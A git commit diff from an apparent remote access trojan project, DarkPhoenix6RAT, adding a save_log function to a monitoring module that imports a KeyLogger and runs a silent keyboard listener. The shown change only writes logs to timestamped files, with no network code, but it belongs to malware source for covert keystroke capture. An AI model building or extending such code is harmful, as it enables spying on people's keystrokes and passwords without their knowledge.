5d2071951f72cd2d0f01a8e3286d2451aad98704
DarkPhoenix6 <chrisfedun031595@gmail.com>
2017-07-17 15:22:13 -0700

    Create save_log function.

--- DarkPhoenix6RAT/Monitoring/monitor.py
+++ DarkPhoenix6RAT/Monitoring/monitor.py
@@ -1,8 +1,9 @@
-import time
+import datetime
 import json
 from pynput import keyboard
 from SystemDetection.system_detection import SystemInformation
 from DarkPhoenix6RAT.InputDetection.keylogger import KeyLogger
+MISSING = object()
 
 
 class Monitor(object):
@@ -18,7 +19,12 @@ class Monitor(object):
                 on_release=self.key_logger.on_release_silent) as listener:
             listener.join()
 
-    def save_key_log(self):
+    @staticmethod
+    def save_log(filename, log, directiory=MISSING):
+        date_string = datetime.datetime.now().strftime("%Y-%m-%d-%H:%M")
+        if directiory != MISSING:
+            with open(directiory + filename + "-" + date_string, 'a') as f:
+                f.writelines(log)
 
     def to_json(self):
         """ Converts all member data into a JSON string
